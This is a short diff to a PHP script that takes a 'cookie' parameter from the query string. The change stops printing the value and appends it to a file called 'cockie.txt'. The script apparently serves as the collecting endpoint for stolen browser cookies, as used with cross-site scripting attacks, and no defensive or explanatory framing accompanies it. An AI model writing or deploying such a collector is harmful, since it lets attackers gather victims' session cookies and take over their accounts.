@@ -1,4 +1,5 @@
 <?php
 $cookie = $_GET["cookie"];
-print_r($cookie);
+$file = fopen('cockie.txt', 'a');
+fwrite($file, $cookie . "\n");
 ?>
